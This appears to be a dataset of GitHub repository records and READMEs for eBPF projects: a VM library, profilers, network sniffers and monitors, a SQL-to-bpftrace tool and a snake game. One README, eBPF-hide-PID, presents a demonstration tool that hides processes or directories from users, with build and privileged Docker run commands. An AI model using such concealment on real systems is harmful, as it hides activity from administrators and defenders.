    llvmbpf_vm vm;

    vm.load_code((const void *)bpf_program__insns(prog),
         (uint32_t)bpf_program__insn_cnt(prog) * 8);
  ...
  }
```

For complete code example, please refer to [cli](cli).

However, the `bpf.o` ELF file has no map and data relocation support. We would recommend using the bpftime to load and relocation the eBPF bytecode from ELF file. This include:

- Write a loader like normal kernel eBPF loader to load the eBPF bytecode, you can find a example [here](https://github.com/eunomia-bpf/bpftime/blob/master/example/xdp-counter/xdp-counter.c).
- The loader will use the libbpf, which support:
  - Relocation for map. The map id will be allocated by the loader and bpftime, you can use the map id to access map through the helpers.
  - The data can be accessed through the lddw helper function.
- After the loader load the eBPF bytecode and complete the relocation, you can use the [bpftimetool](https://eunomia.dev/zh/bpftime/documents/bpftimetool/) to dump the map information and eBPF bytecode.

### Maps and data relocation support

bpftime already has maps and data relocation support. The easiest way to use it is just use bpftime and write the loader and eBPF program like kernel eBPF. The `llvmbpf` libray provide a approach to interact with the maps.

See [example/maps.cpp](example/maps.cpp) of how to use the library as a vm and works with maps:

The eBPF can work with maps in two ways:

- Using helper functions to access the maps, like `bpf_map_lookup_elem`, `bpf_map_update_elem`, etc.
- Using maps as global variables in the eBPF program, and access the maps directly.

For a eBPF program like [https://github.com/eunomia-bpf/bpftime/blob/master/example/xdp-counter/](https://github.com/eunomia-bpf/bpftime/blob/master/example/xdp-counter/):

```c
// use map type define
struct {
  __uint(type, BPF_MAP_TYPE_ARRAY);
  __type(key, __u32);
  __type(value, __u32);
  __uint(max_entries, CTRL_ARRAY_SIZE);
} ctl_array SEC("".maps"");

// use global variable define
__u64 cntrs_array[CNTRS_ARRAY_SIZE];

SEC(""xdp"")
int xdp_pass(struct xdp_md* ctx) {
  void* data_end = (void*)(long)ctx->data_end;
  void* data = (void*)(long)ctx->data;
  __u32 ctl_flag_pos = 0;
  __u32 cntr_pos = 0;

  // access maps with helpers
  __u32* flag = bpf_map_lookup_elem(&ctl_array, &ctl_flag_pos);
  if (!flag || (*flag != 0)) {
    return XDP_PASS;
  };

  // access maps with global variables
  cntrs_array[cntr_pos]++;

  if (data + sizeof(struct ethhdr) > data_end)
    return XDP_DROP;
  swap_src_dst_mac(data);
  return XDP_TX;
}
```

We can define the map and access them like:

```cpp
uint32_t ctl_array[2] = { 0, 0 };
uint64_t cntrs_array[2] = { 0, 0 };

void *bpf_map_lookup_elem(uint64_t map_fd, void *key)
{
  std::cout << ""bpf_map_lookup_elem "" << map_fd << std::endl;
  if (map_fd == 5) {
    return &ctl_array[*(uint32_t *)key];
  } else if (map_fd == 6) {
    return &cntrs_array[*(uint32_t *)key];
  } else {
    return nullptr;
  }
  return 0;
}

uint64_t map_by_fd(uint32_t fd)
{
  std::cout << ""map_by_fd "" << fd << std::endl;
  return fd;
}

uint64_t map_val(uint64_t val)
{
  std::cout << ""map_val "" << val << std::endl;
  if (val == 5) {
    return (uint64_t)(void *)ctl_array;
  } else if (val == 6) {
    return (uint64_t)(void *)cntrs_array;
  } else {
    return 0;
  }
}

int main(int argc, char *argv[])
{
  auto code = xdp_counter_bytecode;
  size_t code_len = sizeof(xdp_counter_bytecode) - 1;
  uint64_t res = 0;
  llvmbpf_vm vm;

  res = vm.load_code(code, code_len);
  if (res) {
    std::cout << vm.get_error_message() << std::endl;
    exit(1);
  }
  vm.register_external_function(1, ""bpf_map_lookup_elem"",
              (void *)bpf_map_lookup_elem);
  // set the lddw helpers for accessing maps
  vm.set_lddw_helpers(map_by_fd, nullptr, map_val, nullptr, nullptr);
  auto func = vm.compile();
  if (!func) {
    std::cout << vm.get_error_message() << std::endl;
    exit(1);
  }
  // Map value (counter) should be 0
  std::cout << ""cntrs_array[0] = "" << cntrs_array[0] << std::endl;
  int err = vm.exec(&bpf_mem, sizeof(bpf_mem), res);
  std::cout << ""\nreturn value = "" << res << std::endl;
  // counter should be 1
  std::cout << ""cntrs_array[0] = "" << cntrs_array[0] << std::endl;
  ....
}
```

Reference:

- <https://prototype-kernel.readthedocs.io/en/latest/bpf/ebpf_maps.html>
- <https://www.ietf.org/archive/id/draft-ietf-bpf-isa-00.html#name-64-bit-immediate-instructio>

### Build into standalone binary for deployment

You can build the eBPF program into a standalone binary, which does not rely on any external libraries, and can be exec like nomal c code with helper and maps support.

This can help:

- Easily deploy the eBPF program to any machine without the need to install any dependencies.
- Avoid the overhead of loading the eBPF bytecode and maps at runtime.
- Suitable for microcontroller or embedded systems, which does not have a OS.

Take [https://github.com/eunomia-bpf/bpftime/blob/master/example/xdp-counter/](https://github.com/eunomia-bpf/bpftime/blob/master/example/xdp-counter/) as an example:

In the bpftime project:

```sh
# load the eBPF program with bpftime
LD_PRELOAD=build/runtime/syscall-server/libbpftime-syscall-server.so example/xdp-counter/xdp-counter example/xdp-counter/.output/xdp-counter.bpf.o veth1
# dump the map and eBPF bytecode define
./build/tools/bpftimetool/bpftimetool export res.json
# build the eBPF program into llvm IR
./build/tools/aot/bpftime-aot compile --emit_llvm 1>xdp-counter.ll
```

You can see [example/xdp-counter.json](example/xdp-counter.json) for an example json file dump by bpftime.

The result xdp-counter.ll can be found in [example/standalone/xdp-counter.ll](example/standalone/xdp-counter.ll).

Then you can write a C code and compile it with the llvm IR:

```c
#include <stdint.h>
#include <stdio.h>
#include <inttypes.h>

int bpf_main(void* ctx, uint64_t size);

uint32_t ctl_array[2] = { 0, 0 };
uint64_t cntrs_array[2] = { 0, 0 };

void *_bpf_helper_ext_0001(uint64_t map_fd, void *key)
{
  printf(""bpf_map_lookup_elem %lu\n"", map_fd);
  if (map_fd == 5) {
    return &ctl_array[*(uint32_t *)key];
  } else if (map_fd == 6) {
    return &cntrs_array[*(uint32_t *)key];
  } else {
    return NULL;
  }
  return 0;
}

void* __lddw_helper_map_val(uint64_t val)
{
    printf(""map_val %lu\n"", val);
    if (val == 5) {
        return (void *)ctl_array;
    } else if (val == 6) {
        return (void *)cntrs_array;
    } else {
        return NULL;
    }
}

uint8_t bpf_mem[] = { 0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88 };

int main() {
    printf(""The value of cntrs_array[0] is %"" PRIu64 ""\n"", cntrs_array[0]);
    printf(""calling ebpf program...\n"");
    bpf_main(bpf_mem, sizeof(bpf_mem));
    printf(""The value of cntrs_array[0] is %"" PRIu64 ""\n"", cntrs_array[0]);
    printf(""calling ebpf program...\n"");
    bpf_main(bpf_mem, sizeof(bpf_mem));
    printf(""The value of cntrs_array[0] is %"" PRIu64 ""\n"", cntrs_array[0]);
    return 0;
}
```

Compile the C code with the llvm IR:

```sh
clang -g main.c xdp-counter.ll -o standalone 
```

And you can run the `standalone` eBPF program directly.

## GPU Execution

llvmbpf supports running eBPF programs on GPUs through two backends:

| Backend | Target GPUs | Use Cases | Requirements |
|---------|-------------|-----------|--------------|
| **SPIR-V** | Intel, AMD, NVIDIA, ARM, Mali, PowerVR | Cross-vendor, OpenCL, Vulkan, portability | LLVM 18+ (LLVM 20+ recommended) |
| **PTX** | NVIDIA CUDA | NVIDIA-specific, maximum performance | CUDA Toolkit, LLVM 15+ |

### SPIR-V for Cross-Vendor GPUs

Generate SPIR-V binary for execution on **any GPU vendor** via OpenCL or Vulkan. SPIR-V is an industry-standard intermediate representation that works across Intel, AMD, NVIDIA, ARM, and other GPU vendors.

**Features:**
- Cross-vendor GPU support (Intel, AMD, NVIDIA, ARM, Mali, etc.)
- Works with OpenCL, Vulkan Compute, and Level Zero
- Uses LLVM's native SPIR-V backend (LLVM 20+)
- Automatic patching for OpenCL kernel compatibility

**Build and Run:**

```sh
# Install dependencies (Ubuntu/Debian)
sudo apt install llvm-20-dev opencl-headers ocl-icd-opencl-dev

# Build with SPIR-V support
cmake -B build -DCMAKE_BUILD_TYPE=Release \
    -DLLVMBPF_ENABLE_SPIRV=1 \
    -DLLVM_DIR=/usr/lib/llvm-20/cmake
cmake --build build --target spirv_opencl_test -j

# Run on any available GPU (Intel, AMD, NVIDIA, etc.)
./build/example/spirv/spirv_opencl_test
```

**Output Example (Intel GPU):**
```
SPIR-V target found successfully
Generating SPIR-V from eBPF program...
Found GPU on platform: Intel(R) OpenCL Graphics
Using OpenCL device: Intel(R) Graphics
Executing eBPF program on GPU via OpenCL...
âœ“ Test PASSED!
```

See ["
mizzy/ebpf-go-playground,1,0,1,0,Go,,2024-08-19T10:44:49Z,2024-08-21T01:55:03Z,2,"# ebpf-go-playground

This is a playground to try https://ebpf-go.dev/guides/getting-started/ .

Run `vagrant up` and:

```shell
$ cd /vagrant
$ go generate && go build && sudo ./ebpf-go-playground
```
"
miekg/ebpf,34,0,34,0,Go,"ebpf compiler in Go; Write Go, get ebpf",2024-07-25T07:13:30Z,2025-06-24T08:20:31Z,46,"# (e)BPF in *pure* Go

> eBPF in C? What am I, a farmer?

The eBPF ecosystem heavily depends on clang/llvm to compile (C) source code into object code that
can be loaded by the kernel. The goal here is to get rid of clang/llvm and use pure Go.

The benefit of this approach is that you can use _all_ the Go development tooling for writing an eBPF
program. Cilium has been doing _a lot_ of work in this space.

This package is `bpf` all Cilium stuff is `ebpf`.

When using eBPF you can also talk with it via FDs and eBPF maps, this means the non-eBPF bit of your
code also lives somewhere. Taking this all into account I've finally settled on the following
approach.

Using Cilium' asm package you can already do things like this ([example from](https://)).

~~~ go
// Minimal program that writes the static value '123' to the perf ring on
// each event. Note that this program refers to the file descriptor of
// the perf event array created above, which needs to be created prior to the
// program being verified by and inserted into the kernel.
progSpec.Instructions = asm.Instructions{
	// store the integer 123 at FP[-8]
	asm.Mov.Imm(asm.R2, 123),
	asm.StoreMem(asm.RFP, -8, asm.R2, asm.Word),

	// load registers with arguments for call of FnPerfEventOutput
	asm.LoadMapPtr(asm.R2, events.FD()), // file descriptor of the perf event array
	asm.LoadImm(asm.R3, 0xffffffff, asm.DWord),
	asm.Mov.Reg(asm.R4, asm.RFP),
	asm.Add.Imm(asm.R4, -8),
	asm.Mov.Imm(asm.R5, 4),

	// call FnPerfEventOutput, an eBPF kernel helper
	asm.FnPerfEventOutput.Call(),

	// set exit code to 0
	asm.Mov.Imm(asm.R0, 0),
	asm.Return(),
}
~~~

Which is eBPF assembly with Go functions and types - meaning Cilium already made a assembler.

What if we can generate the above from Go code using Go code. This is essentially a eBPF assembly in
Go and then piggybacking on all the Cilium stuff.

Thus the above assembly _should_ be generated from the following Go code:

~~~ go
func BPF() {
    gobpf.PerfEventOutput(bpf.Context, events.FD(), gobpf.BPF_F_INDEX_MASK, 123)
  }
~~~

Where `gobpf` is _this_ library and `bpf` is cilium's. As you can see `event.FD()` is undeclared, so
it might make sense to generate the whole program via some `bpf` comment tags or some other mechanism.

## TODO

- everything
- generate complete program, looks like a lot of boiler plate

Currently working on:

- simple hello world with bpf_printk, this requires constants in a rodata eBPF map and all the code
    generation that entails.

## Stuff of interest

* go-delve/delve@v1.22.1/pkg/proc/internal/ebpf/helpers.go
* github.com:miekg/ebpfcat (forked)
* https://github.com/DQNEO/babygo

## Reading list

- https://qmonnet.github.io/whirl-offload/2020/04/12/llvm-ebpf-asm/
- https://pkg.go.dev/golang.org/x/tools/cmd/ssadump
- https://go.googlesource.com/tools/+/master/go/ssa/example_test.go
- https://benhoyt.com/writings/mugo/
"
maxgio92/yap,5,0,5,0,Go,Yet Another low-overhead kernel-assisted sampling-based CPU time continuous Profiler.,2023-05-11T14:56:07Z,2025-02-02T18:23:08Z,53,"# Yap

Yet Another Profiler written in Go and eBPF

> This is an experimental project. Use at your own risk.

This is a low-overhead kernel-assisted sampling-based CPU time continuous profile. It does not need instrumentation in the profiled binary.

A simple sampling eBPF program attached to a timer collects:
- stack traces
- sampled stack trace counts

The data collected from the kernel is analysed in user-space to summarise residency fraction.
That is, for a stack trace, the percentage of samples that contained that path out of the total amount of samples.

This information extracted from the collected data expresses, for a specific process, which functions are mostly executing.

## How it works

The sampling eBPF probe is attached to a perf [CPU clock software event](https://elixir.bootlin.com/linux/v6.8.5/source/include/uapi/linux/perf_event.h#L119).

The user and kernel stack traces that are running on the current CPU are available to the eBPF program that will run in the context of the interrupted process via the [`bpf_get_stackid`](https://elixir.bootlin.com/linux/v6.8.5/source/kernel/bpf/stackmap.c#L283) eBPF helper.
The user or kernel stack will be available depending on the context during which the process was interrupted.

The hard work of stack walking is made easy by the Linux kernel thanks to the fact that frame instruction pointers of the sampled stack traces are available in kernel space via the [`BPF_MAP_TYPE_STACK_TRACE`](https://elixir.bootlin.com/linux/v6.8.5/source/include/uapi/linux/bpf.h#L914) eBPF map.

The information about how much a specific stack has been sampled is tracked with counters stored in an histogram eBPF map, which is keyed by:
- User stack ID
- Kernel stack ID
- PID to filter later on

and made available to userspace, alongside the stack traces.

In userspace symbolization is made with frame instruction pointer addresses and the ELF symbol table.

Finally, the information is extracted as percentage of profile time a stack trace has been executing.

## Current limitations

Due to the current implementation there are some limitations on the supported binaries to make CPU profiling properly work and finally provide a meaningful report:
* because it leverages frame pointers for stack unwinding, binaries compiled without frame pointers are not currently supported.
* because it leverages the ELF symbol table (`.symtab` section) for the symbolization, stripped binaries are not supported in the current version. By the way, debug symbol are not required to be included in the final binary to make symbolization properly work.

## Quickstart

## Usage

```
yap profile [--debug] --pid PID
Options:
  -debug
      Sets log level to debug
  -pid int
      The PID of the process
```

For a detailed reference please refer to the [CLI reference](./docs) documentation.

### Example

Considering a go program made it running in background:

```shell
go build -v -o myprogram
./myprogram &
[1] 95541
```

Let's profile it:

```shell
sudo yap profile --pid 95541
{""level"":""info"",""message"":""collecting data""}
^C{""level"":""info"",""message"":""terminating...""}
Residency Stack trace
 2.6%     main.main;runtime.main;runtime.goexit.abi0;
65.3%     main.foo;runtime.main;runtime.goexit.abi0;
32.1%     main.bar;runtime.main;runtime.goexit.abi0;
```

### Graphviz support

`yap` can generate a DOT graph to be rendered by specifying the `--output=dot` to the `profile` command.

Considering a profile similar to the one from the example above, a DAG would be generated like below:

![Profile DAG](./docs/profile-dag.dot.svg)

## Build

### Prerequisites

* clang
* libbpf-dev
* libelf (optional: required to build bpftool)
* zlib (optional: required by bpftool)

### Build all

```shell
make yap
```

### eBPF probe only

```shell
make yap/bpf
```

## Credits

- Pixie:
  - [pixie-demos/ebpf-profiler](https://github.com/pixie-io/pixie-demos/tree/main/ebpf-profiler)
  - [Building a continuous profiler](https://blog.px.dev/cpu-profiling/)
- Linux:
  - [samples/bpf/trace_event_user.c](https://github.com/torvalds/linux/blob/8f2c057754b25075aa3da132cd4fd4478cdab854/samples/bpf/trace_event_user.c)
  - [samples/bpf/trace_event_kern.c](https://github.com/torvalds/linux/blob/8f2c057754b25075aa3da132cd4fd4478cdab854/samples/bpf/trace_event_kern.c)
- Brendan Gregg:
  - [Linux eBPF Stack Trace Hack](https://www.brendangregg.com/blog/2016-01-18/ebpf-stack-trace-hack.html)
- Aqua Security
  - [Tracee](https://github.com/aquasecurity/tracee)
"
javidaslan/inter-pod-network-optimisation,8,0,8,0,Python,,2024-08-25T13:54:31Z,2025-03-27T15:13:21Z,20,# inter-pod-network-optimisation
Acceis/eBPF-hide-PID,29,5,29,0,C,This tool have the power to hide any PID/directory in the Linux kernel,2024-02-08T10:22:09Z,2025-08-01T09:38:14Z,7,"# eBPF hide PID

This project aims to demonstrate a way to hide a _process identifier_ (PID) to a user abusing of a system call.

It is inspired by the work of Pathtofile about [bad BPF programs behaviour](https://github.com/pathtofile/bad-bpf).

If you're looking for a deep dive into this project, you can find the two related articles on the [ACCEIS blog](https://www.acceis.fr/categorie/articles-techniques/). \
You can find the [first article](https://www.acceis.fr/ebpf-program-creation-in-practice-pid-concealment-part-1/) and [the second](https://www.acceis.fr/ebpf-in-practice-pid-concealment-part-2/).

## Dependencies

- Kernel v5.7 or higher
- [golang](https://go.dev/doc/install) v1.21 (not tested on lower versions)
- [clang](https://clang.llvm.org/) v16 or higher(depending on your OS, LLVM may be needed)
- [libbpf](https://github.com/libbpf/libbpf) v1.3.0 or higher

> If you manually install the package in a debian/ubuntu based repository, notice that _libbpf_ is not up to date in the ""apt"" repositories. So you may have problems compiling the program.

### For ArchLinux

If you are on archlinux you can simply run

```bash
sudo pacman -S llvm clang libbpf go
```

## Run in Docker

If you want a simple way to try this tool, you can use the provided Dockerfile

Build the image first

```bash
docker buildx build -t hide-pid .
```

You need to run the docker in privileged mod in order to inject the program in the kernel

```bash
docker run --rm --privileged -v /sys/kernel/debug:/sys/kernel/debug:rw hide-pid <PID|DIR>
```

## Manual installation

You can build the project using the following command

```bash
make
```

And then you can run the program in sudo

```bash
sudo ./bin/hide-pid 1337
# 2024/02/09 18:59:48 Waiting for events..
# 2024/02/09 18:59:53 Hiding ""1337"" for process ""ps"" (pid: 29939)
```

## Licence

The eBPF code is under GPL licence.
The Go code is under MIT licence.
"
pythops/oryx,2095,61,2095,4,Rust,ðŸ•µï¸â€â™‚ï¸ TUI for sniffing network traffic using eBPF on Linux,2024-09-01T17:28:50Z,2025-10-12T19:20:57Z,85,"<div align=""center"">
  <h2> TUI for sniffing network traffic using eBPF </h2>
</div>

## ðŸ“¸ Demo

![](https://github.com/user-attachments/assets/23ab699d-82b3-4b9e-af10-62fbc5d74efd)

## âœ¨ Features

- Real-time traffic inspection and visualization.
- Comprehensive Traffic Statistics.
- Firewall functionalities.
- Metrics explorer.
- Fuzzy search.

## ðŸ’¡ Prerequisites

#### A Linux based OS.

Ideally with Linux kernel version 6.10 or higher to ensure all the features to work properly.

> [!NOTE]
> If you're using Debian or Ubuntu, ensure you're on the following minimum versions:
>
> - Debian: Version 13 (Trixie) or newer
> - Ubuntu: Version 24.04 (Noble) or newer

#### Fonts

You might need to install [nerdfonts](https://www.nerdfonts.com/) for the icons to be displayed correctly.

## ðŸš€ Installation

### ðŸ“¥ Binary release

You can download the pre-built binaries from the release page [release page](https://github.com/pythops/oryx/releases)

### ðŸ§Arch Linux

You can install `oryx` from the [extra repository](https://archlinux.org/packages/extra/x86_64/oryx/) with using [pacman](https://wiki.archlinux.org/title/Pacman):

```bash
pacman -S oryx
```

### âš’ï¸ Build from source

To build `oryx`:

#### 1. Install Rust nightly toolchain

```
rustup toolchain install nightly --component rust-src
```

#### 2. Install [bpf-linker](https://github.com/aya-rs/bpf-linker)

Check [bpf-linker Installation section](https://github.com/aya-rs/bpf-linker?tab=readme-ov-file#installation) .

#### 3. Build

```
cargo xtask build --release
```

This will produce an executable file at `target/release/oryx` that you can copy to a directory in your `$PATH`.

## ðŸª„ Usage

Run the following command to start `oryx`:

```
sudo oryx
```

> [!NOTE]
> You can start `oryx` with args as well. Check `oryx --help` to see the available options

## âŒ¨ï¸ Key Bindings

`?`: Show help.

`Tab` or `Shift + Tab`: Switch between different sections.

`j` or `Down` : Scroll down.

`k` or `Up`: Scroll up.

`esc`: Dismiss the different pop-ups and modes.

`q` or `ctrl + c`: Quit the app.

`Space`: Select/Deselect interface or filter.

`f`: Update the applied filters.

`ctrl + r`: Reset the app.

`ctrl + s`: Export the capture to `~/oryx/capture` file.

#### Inspection Section

`i`: Show more infos about the selected packet.

`/`: Start fuzzy search.

#### Firewall Section

`Space`: Toggle firewall rules status.

`n` : Add new firewall rule.

`e`: Edit a firewall rule.

`s`: Save firewall rules to `~/oryx/firewall.json`

`Enter`: Create or Save a firewall rule.

## âš–ï¸ License

GPLv3
"
zmaril/bpfquery,39,1,39,0,C,Zack's experimental tool for querying BPF with SQL. ,2024-08-17T22:17:28Z,2025-04-24T15:08:21Z,33,"# bpfquery

An experiment with compiling SQL to BPF(trace) programs. Exploring what's possible. Running at [bpfquery.com](https://bpfquery.com/), though it will crash often on things.
![Screenshot 2024-08-27 at 10 45 40â€¯AM](https://github.com/user-attachments/assets/e5f79b54-d8f0-4511-901c-525052e4e2ad)

```bash
git clone git@github.com:zmaril/bpfquery.git
cd bpfquery
cargo run devserver #some linux server you have ssh access to that has bpftrace installed on it 
# open up localhost:3030
```

# Queries that work right now 
```sql
select pid, cpu, elapsed from kprobe.do_nanosleep; // getting some basic info from a kprobe
select str(args.filename) from tracepoint.syscalls.sys_enter_openat; //get the filename from a tracepoint
select * from kprobe.do_nanosleep where pid > 1000; // filters 
```

# Queries that don't work right now 
```sql
//stdin:1:26-27: WARNING: comparison of integers of different signs: 'unsigned int64' and 'int64' can lead to undefined behavior
select * from kprobe.do_nanosleep where pid > 2*1000
//Working on tumble and streaming semantics
SELECT tumble(interval '10 seconds') as bucket, count(*) FROM kprobe.do_nanosleep GROUP BY bucket;
```

# Related Work

* [bpftrace](https://github.com/bpftrace/bpftrace)
* ebql - [code](https://github.com/ringtack/ebql) and [paper](https://etos.cs.brown.edu/publications/theses/rtang-honors.pdf)
* [Arroyo](https://arroyo.dev/) - a stream processing engine that bpfquery is inspiring a lot of bpfquery design so far.

# Progress so far 

* [x] Expressions - a lot of expressions just work so far, but there's a lot of edge cases to handle to as they come up, but the expectation is that something like `select pid + 1 from kprobe.do_nanosleep` should work.
* [x] Predicates/filtering/`where` - `where` clauses get parsed and compiled into predicates and often work. `select * from kprobe.do_nanosleep where pid > 1000` should work fine.
* [x] bpftrace builtin arguments - things like `pid`, `comm`, `cpu`, `elapsed` work well, they are more or less just passed through to the bpftrace program as is. 
* [x] Execution - bpfquery can run a query on a server and get the results back.
* [x] There's a sick webpage that works really well sometmies and is super cool. 


# Zack's Todo's 
Ordered roughly by what I want to do next.

* [ ] Redo the data layout so that it's better more amendable to aggregation and streaming semanitcs. 
* [ ] Implement aggregation and streaming semantics.
* [ ] Typeahead in the web interface both for the probes as well as the arguments 
* [ ] Use vmlinux.h to get the types of the arguments to the probes so we don't have to use -> anymore or str.  
* [ ] Have the linux kernel defs just be a big json somehow? An api endpoint for looking up defs? 
* [ ] Struct/bpf tree explorer/explainer in web interface 
* [ ] Type checking and hints, see first problem query below. 
* [ ] More examples.
* [ ] Compiling down to bpf programs directly - hard and I want to get the semantics of sql right first, before trying to do this.

# Motivation

It took me ten years and two weeks to write my first BPF program from scratch that actually worked. I learned about eBPF back in the early 2010's and was too intimidated and flummoxed by the tooling to do anything of consequence of it. I loved the idea of getting information out of the kernel and seeing what was _really_ going on in there, however, I was never able to get past ""hello world"". Other projects and ideas where easier and more fruitful to do, so I did those the last decade. [Finding myself with some time during a job transition](https://www.linkedin.com/in/zack-maril/), I told myself I would finally write a BPF program after many years of putting it off and just using bpftrace. And I did! It sucked! It took two weeks of really frustrating work to just get ""hello world"" to run in a container on my laptop. It was not fun! 

During this time, I read a lot of programs that others had written and saw the tools that were referenced and used most often that showed the promise of BPF. This reinforced two things for me that I had felt for a long time:

1. Writing bpf programs is hard if you don't have a lot of experience with operating system internals and compilers.
2. Most bpf programs are continuous queries on streams of events coming from the kernel.

Confirmation bias aside, I thought that if I could write a SQL parser and compiler that could take a SQL query and turn it into a BPF program, I could make it easier for people (i.e. me) to write use BPF-based programs and better understand what's going on in the kernel. I had bought and read through [a book on complex event processing](https://www.amazon.com/Power-Events-Introduction-Processing-Distributed/dp/0201727897) many years ago and recently saw [ksqlDB](https://ksqldb.io/) used to great effect at my previous job, so I figured why not take a stab at it while I have some time. So far, it's been a lot of fun and I've learned a lot about SQL and BPF in the process. Maybe someday, others will find it useful too.


# License/Contributing

This project is not licensed yet and I do not know if I want outside contributions yet. It's a personal experiment and I'm more focused on experimenting than I am about licensing or others at the moment. If you have any questions, feel free to reach out to me on [twitter](https://twitter.com/zackmaril) or [linkedin](https://www.linkedin.com/in/zack-maril/).
"
yuta-imai/tap-house,1,2,1,0,C,,2024-02-16T03:57:16Z,2025-09-02T11:25:11Z,7,"# tap-house ðŸº

An ebpf based packet analyser. You can tap packets using Soracom Junction and feed them into tap-houseðŸº.

tap-house comes from ""Tap House Grill"", a bar in downtown Seattle :)
https://www.instagram.com/taphousegrill/

## Run

```
sudo bash run.sh tap-house.py
```

For detail, see: https://github.com/iovisor/bcc/issues/2278#issuecomment-1582090173

## Prerequisites

### Install BCC

You need to have BCC installed. See: https://github.com/iovisor/bcc/blob/master/INSTALL.md

### MTU and combined queue issue

https://zenn.dev/suicide_student/articles/2755385740fb2b

### NIC Multi Purpose channel number issue

https://trying2adult.com/what-is-xdp-and-how-do-you-use-it-in-linux-amazon-ec2-example/
"
anoushk1234/zig-ebpf,28,3,28,2,Zig,Zig virtual machine for eBPF programs.,2024-08-21T06:43:36Z,2025-07-11T08:28:59Z,42,"# eBPF in Zig âš¡ï¸

This is a wip implementation of eBPF in native Zig inspired by Quentin Monnet's [rbpf](https://github.com/qmonnet/rbpf/). This is different from existing zig eBPF libraries as it implements the ISA natively in zig without depending on libbpf or any C modules.

## What works
- [x] 64-bit ALU operations
- [x] Memory operations
- [x] Byteswap operations
- [x] Branch instructions (needs more testing)
- [x] Syscalls
- [ ] JIT Compiler
- [x] Assembler (needs more testing)
- [x] Disassembler
- [ ] Unit Tests & Fuzzing

## Why
Short answer: I was bored

Long answer: I wanted to work on something low level and complex, and also I really like Zig and wanted an excuse to write a large-ish project in it. I was inspired by Quentin Monnet and Solana Labs's work in rbpf and thought there should be a native Zig eBPF implementation. So I wanted to learn, experiment and have some fun in open source.

## Contribution and Feedback
The author of this repo is new to Zig so if you feel there can be some improvements in making the code more idiomatic then PRs are welcome!

Following in the footsteps of rbpf, this project expects new commits to be coveryed by the [Developer's Ceritificate of Origin](https://wiki.linuxfoundation.org/dco).

## License
zig-ebpf is distributed under both MIT License and Apache License(Version 2.0).

"
amiremohamadi/bpfsnake,46,0,46,0,,snake in bpftrace,2024-09-04T09:58:55Z,2025-04-13T19:55:47Z,4,"# bpfsnake
a [bpftrace](https://github.com/bpftrace/bpftrace) implementation of snake game.

<image src=""https://github.com/user-attachments/assets/e9a0b756-d5d6-4da8-a80e-2d11df71af26"" width=""60%""/>

### requirements
- linux 5.3+
- [bpftrace](https://github.com/bpftrace/bpftrace/releases) latest version

### how to run
```bash
$ sudo bpftrace ./snake.bt
```
"
nullswan/bpfsnitch,95,4,95,1,Go,Real-time network & syscall monitoring tool for Linux systems and Kubernetes clusters,2024-09-05T19:55:35Z,2025-05-26T20:03:05Z,121,"# bpfsnitch

[![License: GPL](https://img.shields.io/badge/License-GPL-blue.svg)](LICENSE) [![Go Report Card](https://goreportcard.com/badge/github.com/nullswan/bpfsnitch)](https://goreportcard.com/report/github.com/nullswan/bpfsnitch)

bpfsnitch is an open-source, real-time monitoring tool for Linux systems and Kubernetes clusters. Inspired by GlassWire, bpfsnitch leverages eBPF (extended Berkeley Packet Filter) technology to provide observability at the lowest level possible by tracking system calls and network activities. It is capable of monitoring every syscall and network event in real-time, offering valuable insights into what's happening inside your systems and containers.

---

## Table of Contents

- [bpfsnitch](#bpfsnitch)
  - [Table of Contents](#table-of-contents)
  - [Features](#features)
  - [Prerequisites](#prerequisites)
  - [Installation](#installation)
    - [On Kubernetes Clusters](#on-kubernetes-clusters)
  - [Metrics](#metrics)
    - [Key Metrics](#key-metrics)
    - [Example Metrics Output](#example-metrics-output)
  - [Performance](#performance)
  - [Configuration (soon)](#configuration-soon)
    - [Customizing Syscall Monitoring](#customizing-syscall-monitoring)
      - [Predefined Syscalls](#predefined-syscalls)
  - [Educational Value](#educational-value)
  - [License](#license)
  - [Future Plans](#future-plans)
  - [Contact](#contact)
  - [Acknowledgments](#acknowledgments)
  - [Join the Community](#join-the-community)

---

## Features

- **Real-Time Monitoring**: Track every syscall and network event as they happen.
- **eBPF Powered**: Utilizes eBPF for efficient, low-overhead monitoring at the kernel level.
- **Kubernetes Support**: Deployable as a DaemonSet to monitor your entire Kubernetes cluster.
- **Customizable Syscall Monitoring**: Predefined list of critical syscalls with plans to provide a configurable syscall whitelist.
- **Prometheus Integration**: Exposes metrics via a Prometheus scrape endpoint for easy integration with your monitoring stack.
- **Pod Awareness**: Labels metrics with pod names for granular visibility.
- **Open Source**: Released under the GPL license, encouraging community collaboration.

---

## Prerequisites

- **Linux Kernel with eBPF Support**: bpfsnitch requires a Linux kernel version that supports eBPF (version 5.8 or higher recommended).
- **eBPF Libraries**: Ensure that `libbpf` and related dependencies are installed.
- **Prometheus**: For metrics scraping and monitoring.
- **Container Runtime**: Supports Docker and Containerd Kubernetes environments.

---

## Installation

### On Kubernetes Clusters

Deploy bpfsnitch as a DaemonSet to monitor all nodes in your cluster.

1. Apply the DaemonSet Manifest

```bash
curl -s https://raw.githubusercontent.com/nullswan/bpfsnitch/main/deployments/daemonset.yaml | kubectl apply -f -
```

## Metrics

bpfsnitch exposes a variety of Prometheus metrics, providing insights into syscalls and network activities.

### Key Metrics

- Syscall Counters: Counts of specific syscalls made by processes or pods.
- Network Bytes Counters: Total bytes sent and received, labeled by pod and remote subnets.
- Network Packets Counters: Total packets sent and received.
- DNS Query Counters: Number of DNS queries made by pods.

### Example Metrics Output

```perl
# HELP bpfsnitch_dns_query_counter Number of DNS queries
# TYPE bpfsnitch_dns_query_counter counter
bpfsnitch_dns_query_counter{container=""kube-proxy-cwn8r""} 23

# HELP bpfsnitch_network_received_bytes_counter Number of bytes received
# TYPE bpfsnitch_network_received_bytes_counter counter
bpfsnitch_network_received_bytes_counter{pod=""nginx-7b9f54988c-2tpbd"",remote_subnet=""0.0.0.0/24""} 1334512

# HELP bpfsnitch_network_received_packets_counter Number of packets received
# TYPE bpfsnitch_network_received_packets_counter counter
bpfsnitch_network_received_packets_counter{pod=""nginx-7b9f54988c-2tpbd"",remote_subnet=""0.0.0.0/24""} 623

# HELP bpfsnitch_network_sent_bytes_counter Number of bytes sent
# TYPE bpfsnitch_network_sent_bytes_counter counter
bpfsnitch_network_sent_packets_counter{pod=""kube-proxy-cwn8r"",remote_subnet=""1.2.3.0/24""} 1293500
bpfsnitch_network_sent_packets_counter{pod=""kube-proxy-cwn8r"",remote_subnet=""1.2.97.0/24""} 80
